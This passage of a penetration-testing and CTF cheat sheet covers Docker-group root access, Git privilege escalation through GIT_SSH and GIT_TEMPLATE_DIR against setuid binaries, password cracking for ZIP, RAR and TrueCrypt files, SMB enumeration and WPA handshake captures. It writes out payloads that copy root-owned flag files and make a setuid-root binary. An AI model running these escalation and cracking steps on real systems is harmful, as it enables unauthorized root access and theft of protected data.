env\_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure\_path option is set, its value will be used for the PATH environment variable. This flag is on by default.</span>

<span class="n">mail</span>\<span class="n">_badpass</span> <span class="n">Send</span> <span class="n">mail</span> <span class="n">to</span> <span class="n">the</span> <span class="n">mailto</span> <span class="n">user</span> <span class="k">if</span> <span class="n">the</span> <span class="n">user</span> <span class="n">running</span> <span class="n">sudo</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">enter</span> <span class="n">the</span> <span class="n">correct</span> <span class="n">password</span><span class="o">.</span> <span class="n">If</span> <span class="n">the</span> <span class="n">command</span> <span class="n">the</span> <span class="n">user</span> <span class="ow">is</span> <span class="n">attempting</span> <span class="n">to</span> <span class="n">run</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">sudoers</span> <span class="ow">and</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">mail</span>\<span class="n">_all</span>\<span class="n">_cmnds</span><span class="p">,</span> <span class="n">mail</span>\<span class="n">_always</span><span class="p">,</span> <span class="n">mail</span>\<span class="n">_no</span>\<span class="n">_host</span><span class="p">,</span> <span class="n">mail</span>\<span class="n">_no</span>\<span class="n">_perms</span> <span class="ow">or</span> <span class="n">mail</span>\<span class="n">_no</span>\<span class="n">_user</span> <span class="n">flags</span> <span class="n">are</span> <span class="nb">set</span><span class="p">,</span> <span class="n">this</span> <span class="n">flag</span> <span class="n">will</span> <span class="n">have</span> <span class="n">no</span> <span class="n">effect</span><span class="o">.</span> <span class="n">This</span> <span class="n">flag</span> <span class="ow">is</span> <span class="n">off</span> <span class="n">by</span> <span class="n">default</span><span class="o">.</span>
</pre></div>
</div>
</div>
<div class="section" id="docker-security">
<h3>Docker Security<a class="headerlink" href="#docker-security" title="Permalink to this headline">¶</a></h3>
<p>Any user who is part of the docker group should also be considered root. Read <a class="reference external" href="http://reventlov.com/advisories/using-the-docker-command-to-root-the-host">Using the docker command to root the host</a> Older version of docker were vulnerable to Docker breakout. More details at <a class="reference external" href="https://github.com/gabrtv/shocker">Shocker / Docker Breakout PoC</a></p>
</div>
<div class="section" id="java-keystore-file">
<h3>Java keystore file<a class="headerlink" href="#java-keystore-file" title="Permalink to this headline">¶</a></h3>
<p>Refer <a class="reference external" href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">Java Keytool essentials working with java keystores</a> and <a class="reference external" href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">openssl essentials working with ssl certificates private keys and csrs</a></p>
</div>
<div class="section" id="cracking-md5-hashes">
<h3>Cracking MD5 Hashes<a class="headerlink" href="#cracking-md5-hashes" title="Permalink to this headline">¶</a></h3>
<p>Try <a class="reference external" href="https://crackstation.net/">Crackstation</a> or <a class="reference external" href="https://isc.sans.edu/tools/reversehash.html">ISC Reverse hash</a></p>
</div>
<div class="section" id="steghide">
<h3>Steghide<a class="headerlink" href="#steghide" title="Permalink to this headline">¶</a></h3>
<p>Looking for hidden text in the images? Utilize steghide</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">steghide</span> <span class="n">version</span> <span class="mf">0.5</span><span class="o">.</span><span class="mi">1</span>

<span class="n">the</span> <span class="n">first</span> <span class="n">argument</span> <span class="n">must</span> <span class="n">be</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span><span class="p">:</span>
<span class="n">embed</span><span class="p">,</span> <span class="o">--</span><span class="n">embed</span>          <span class="n">embed</span> <span class="n">data</span>
<span class="n">extract</span><span class="p">,</span> <span class="o">--</span><span class="n">extract</span>      <span class="n">extract</span> <span class="n">data</span>
<span class="n">info</span><span class="p">,</span> <span class="o">--</span><span class="n">info</span>            <span class="n">display</span> <span class="n">information</span> <span class="n">about</span> <span class="n">a</span> <span class="n">cover</span><span class="o">-</span> <span class="ow">or</span> <span class="n">stego</span><span class="o">-</span><span class="n">file</span>
<span class="n">info</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>       <span class="n">display</span> <span class="n">information</span> <span class="n">about</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>
<span class="n">encinfo</span><span class="p">,</span> <span class="o">--</span><span class="n">encinfo</span>      <span class="n">display</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">supported</span> <span class="n">encryption</span> <span class="n">algorithms</span>
<span class="n">version</span><span class="p">,</span> <span class="o">--</span><span class="n">version</span>      <span class="n">display</span> <span class="n">version</span> <span class="n">information</span>
<span class="n">license</span><span class="p">,</span> <span class="o">--</span><span class="n">license</span>      <span class="n">display</span> <span class="n">steghide</span><span class="s1">&#39;s license</span>
<span class="n">help</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">display</span> <span class="n">this</span> <span class="n">usage</span> <span class="n">information</span>
</pre></div>
</div>
</div>
<div class="section" id="git-client-privilege-escalation">
<h3>Git client Privilege Escalation<a class="headerlink" href="#git-client-privilege-escalation" title="Permalink to this headline">¶</a></h3>
<p>Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer <a class="reference external" href="https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial">12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial</a></p>
<p>In one of write-up, <a class="reference external" href="http://devloop.users.sourceforge.net/">Nicolas Surribas</a> has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.</p>
<div class="section" id="git-ssh">
<h4>GIT_SSH<a class="headerlink" href="#git-ssh" title="Permalink to this headline">¶</a></h4>
<p>If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the <a class="reference external" href="mailto:username&#37;&#52;&#48;host">username<span>&#64;</span>host</a> (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> <span class="o">&gt;</span> <span class="n">cmd</span>
<span class="n">echo</span> <span class="s1">&#39;cp /root/flag.txt /tmp&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">cmd</span>
<span class="n">echo</span> <span class="s1">&#39;chmod 777 /tmp/flag.txt&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">cmd</span>
<span class="n">GIT_SSH</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">cmd</span> <span class="o">./</span><span class="n">setuidbinary</span><span class="p">(</span><span class="n">utilizing</span> <span class="n">git</span> <span class="n">clone</span><span class="o">/</span> <span class="n">git</span> <span class="n">fetch</span><span class="p">)</span>

<span class="ow">or</span>

<span class="n">echo</span> <span class="s1">&#39;chown root:root /home/username/priv ; chmod 4755 /home/username/priv&#39;</span> <span class="o">&gt;</span> <span class="n">ssh</span>

<span class="n">where</span> <span class="n">priv</span> <span class="ow">is</span> <span class="n">binary</span> <span class="n">compiled</span> <span class="kn">from</span> <span class="nn">suid.c</span>
</pre></div>
</div>
<p>This basically changes the command from</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">trace</span><span class="p">:</span> <span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">:</span> <span class="n">git</span> <span class="s1">&#39;clone&#39;</span> <span class="s1">&#39;ssh://root@machine-dev:/root/secret-project&#39;</span> <span class="s1">&#39;/mnt/secret-project/&#39;</span>
</pre></div>
</div>
<p>to</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">trace</span><span class="p">:</span> <span class="n">run_command</span><span class="p">:</span> <span class="s1">&#39;/home/user/ssh&#39;</span> <span class="s1">&#39;root@machine-dev&#39;</span> <span class="s1">&#39;git-upload-pack &#39;</span>\<span class="s1">&#39;&#39;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">secret</span><span class="o">-</span><span class="n">project</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="git-template-dir">
<h4>GIT_TEMPLATE_DIR<a class="headerlink" href="#git-template-dir" title="Permalink to this headline">¶</a></h4>
<p>Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer <a class="reference external" href="https://git-scm.com/docs/git-init">Git-init</a></p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cp</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">git</span><span class="o">-</span><span class="n">core</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span> <span class="n">mytemplates</span>
<span class="n">cd</span> <span class="n">mytemplates</span><span class="o">/</span><span class="n">hooks</span>
<span class="n">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> <span class="o">&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">echo</span> <span class="s1">&#39;cp /root/flag /tmp/flag2&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">echo</span> <span class="s1">&#39;chown username.username /tmp/flag2&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">cd</span> <span class="o">../..</span>
<span class="n">GIT_TEMPLATE_DIR</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">mytemplates</span><span class="o">/</span> <span class="o">./</span><span class="n">setuidbinary</span><span class="p">(</span> <span class="n">utilizing</span> <span class="n">git</span> <span class="n">clone</span><span class="o">/</span> <span class="n">git</span> <span class="n">fetch</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="metasploit-shell-upgrade">
<h3>Metasploit shell upgrade<a class="headerlink" href="#metasploit-shell-upgrade" title="Permalink to this headline">¶</a></h3>
<p>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sessions</span> <span class="o">-</span><span class="n">h</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">sessions</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>

<span class="n">Active</span> <span class="n">session</span> <span class="n">manipulation</span> <span class="ow">and</span> <span class="n">interaction</span><span class="o">.</span>

<span class="n">OPTIONS</span><span class="p">:</span>

<span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="n">Upgrade</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">a</span> <span class="n">meterpreter</span> <span class="n">session</span> <span class="n">on</span> <span class="n">many</span> <span class="n">platforms</span>
</pre></div>
</div>
</div>
<div class="section" id="password-protected-file">
<h3>Password Protected File<a class="headerlink" href="#password-protected-file" title="Permalink to this headline">¶</a></h3>
<div class="section" id="zip-file">
<h4>ZIP File<a class="headerlink" href="#zip-file" title="Permalink to this headline">¶</a></h4>
<p>run fcrackzip</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">fcrackzip</span> <span class="o">-</span><span class="n">D</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">p</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">rockyou2</span><span class="o">.</span><span class="n">txt</span> <span class="n">flag</span><span class="o">.</span><span class="n">zip</span>

<span class="o">-</span><span class="n">D</span><span class="p">,</span> <span class="o">--</span><span class="n">dictionary</span><span class="p">:</span>    <span class="n">Select</span> <span class="n">dictionary</span> <span class="n">mode</span><span class="o">.</span> <span class="n">In</span> <span class="n">this</span> <span class="n">mode</span><span class="p">,</span> <span class="n">fcrackzip</span> <span class="n">will</span> <span class="n">read</span> <span class="n">passwords</span> <span class="kn">from</span> <span class="nn">a</span> <span class="n">file</span><span class="p">,</span> <span class="n">which</span> <span class="n">must</span> <span class="n">contain</span> <span class="n">one</span> <span class="n">password</span> <span class="n">per</span> <span class="n">line</span> <span class="ow">and</span> <span class="n">should</span> <span class="n">be</span> <span class="n">alphabetically</span> <span class="nb">sorted</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="n">using</span> <span class="n">sort</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span>
<span class="o">-</span><span class="n">p</span><span class="p">,</span> <span class="o">--</span><span class="n">init</span><span class="o">-</span><span class="n">password</span> <span class="n">string</span> <span class="p">:</span>  <span class="n">Set</span> <span class="n">initial</span> <span class="p">(</span><span class="n">starting</span><span class="p">)</span> <span class="n">password</span> <span class="k">for</span> <span class="n">brute</span><span class="o">-</span><span class="n">force</span> <span class="n">searching</span> <span class="n">to</span> <span class="n">string</span><span class="p">,</span> <span class="ow">or</span> <span class="n">use</span> <span class="n">the</span> <span class="n">file</span> <span class="k">with</span> <span class="n">the</span> <span class="n">name</span> <span class="n">string</span> <span class="n">to</span> <span class="n">supply</span> <span class="n">passwords</span> <span class="k">for</span> <span class="n">dictionary</span> <span class="n">searching</span><span class="o">.</span>
<span class="o">-</span><span class="n">u</span><span class="p">,</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">unzip</span><span class="p">:</span> <span class="n">Try</span> <span class="n">to</span> <span class="n">decompress</span> <span class="n">the</span> <span class="n">first</span> <span class="n">file</span> <span class="n">by</span> <span class="n">calling</span> <span class="n">unzip</span> <span class="k">with</span> <span class="n">the</span> <span class="n">guessed</span> <span class="n">password</span><span class="o">.</span> <span class="n">This</span> <span class="n">weeds</span> <span class="n">out</span> <span class="n">false</span> <span class="n">positives</span> <span class="n">when</span> <span class="ow">not</span> <span class="n">enough</span> <span class="n">files</span> <span class="n">have</span> <span class="n">been</span> <span class="n">given</span><span class="o">.</span>
</pre></div>
</div>
</div>
<div class="section" id="rar2john">
<h4>rar2john<a class="headerlink" href="#rar2john" title="Permalink to this headline">¶</a></h4>
<p>We can get the password hash of a password protected rar file by using rar2john</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[root:~/Downloads]# rar2john crocs.rar
file name: artwork.jpg
crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
</pre></div>
</div>
</div>
</div>
<div class="section" id="truecrypt-files">
<h3>Truecrypt Files<a class="headerlink" href="#truecrypt-files" title="Permalink to this headline">¶</a></h3>
<p>If you have a truecrypt volume to open and crack it&#8217;s password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">truecrack</span> <span class="o">--</span><span class="n">truecrypt</span> <span class="o">&lt;</span><span class="n">Truecrypt</span> <span class="n">File</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">k</span> <span class="n">SHA512</span> <span class="o">-</span><span class="n">w</span> <span class="o">&lt;</span><span class="n">Wordlist_File</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>and Veracrypt or cryptsetup to open the file.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cryptsetup</span> <span class="nb">open</span> <span class="o">--</span><span class="nb">type</span> <span class="n">tcrypt</span> <span class="o">&lt;</span><span class="n">Truecrypt</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">MountName</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="others">
<h3>Others<a class="headerlink" href="#others" title="Permalink to this headline">¶</a></h3>
<ul class="simple">
<li>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.</li>
<li>If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</li>
<li>Identification of OS:</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">os</span><span class="o">-</span><span class="n">release</span>

<span class="n">NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu&quot;</span> <span class="n">VERSION</span><span class="o">=</span><span class="s2">&quot;16.04 LTS (Xenial Xerus)&quot;</span> <span class="n">ID</span><span class="o">=</span><span class="n">ubuntu</span>
<span class="n">ID</span>\<span class="n">_LIKE</span><span class="o">=</span><span class="n">debian</span> <span class="n">PRETTY</span>\<span class="n">_NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu 16.04 LTS&quot;</span> <span class="n">VERSION</span>\<span class="n">_ID</span><span class="o">=</span><span class="s2">&quot;16.04&quot;</span>
<span class="n">HOME</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://www.ubuntu.com/&quot;</span>
<span class="n">SUPPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://help.ubuntu.com/&quot;</span>
<span class="n">BUG</span>\<span class="n">_REPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://bugs.launchpad.net/ubuntu/&quot;</span>
<span class="n">UBUNTU</span>\<span class="n">_CODENAME</span><span class="o">=</span><span class="n">xenial</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).</li>
</ul>
<blockquote>
<div><div class="admonition-todo admonition" id="index-0">
<p class="first admonition-title">Todo</p>
<p class="last">Mention examples for IPv6 connect</p>
</div>
</div></blockquote>
<ul class="simple">
<li>Port 139 Open</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span>smbclient -N -L 192.168.1.2 WARNING: The &quot;syslog&quot; option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
kathy           Disk      Fred, What are we doing here?
tmp             Disk      All temporary files should be stored here
IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

Server               Comment
---------            -------
RED                  red server (Samba, Ubuntu)

Workgroup            Master
---------            -------
WORKGROUP            RED

-N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
-L host and a list should appear. The -I option may be useful if your NetBIOS names don&#39;t match your TCP/IP DNS host names or if you are trying to reach a host on another network.
</pre></div>
</div>
<p>If you want to access the share you might want to type</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="n">IP</span>\\<span class="n">share</span>\<span class="n">_name</span>
</pre></div>
</div>
<p>So, in the above example, it would be</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span>\\<span class="n">kathy</span>
</pre></div>
</div>
<p>If port 139 is open, also run enum4linux, may be it would help get the user list</p>
</div></blockquote>
<ul>
<li><p class="first">Port 69 UDP:</p>
<p>TFTP</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">get</span> <span class="ow">or</span> <span class="n">put</span> <span class="n">file</span>
</pre></div>
</div>
</li>
<li><p class="first">Ruby Best way to get quoted words / phrases out of the text</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">text</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="o">/</span><span class="s2">&quot;([^&quot;</span><span class="p">]</span>\<span class="o">*</span><span class="p">)</span><span class="s2">&quot;/)</span>
</pre></div>
</div>
</li>
<li><p class="first">Convert all text in a file from UPPER to lowercase</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">tr</span> <span class="s1">&#39;[:upper:]&#39;</span> <span class="s1">&#39;[:lower:]&#39;</span> <span class="o">&lt;</span> <span class="nb">input</span><span class="o">.</span><span class="n">txt</span> <span class="o">&gt;</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</li>
<li><p class="first">Remove lines longer than x or shorter than x</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">awk</span> <span class="s1">&#39;length($0)&gt;x&#39;</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">awk</span> <span class="s1">&#39;length($0)</span>
</pre></div>
</div>
</li>
<li><p class="first">Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if &#8220;Policy of Truth&#8221; is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.</p>
</li>
<li><p class="first">Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.</p>
</li>
<li><p class="first">If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it&#8217;s a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922176</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922688</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.923157</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924224</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924736</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.925723</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933402</span> <span class="n">Probe</span> <span class="n">Response</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span> <span class="n">CH</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span> <span class="n">PRIVACY</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933908</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.934427</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.991250</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992274</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992282</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992795</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992787</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994834</span> <span class="n">Assoc</span> <span class="n">Request</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span>
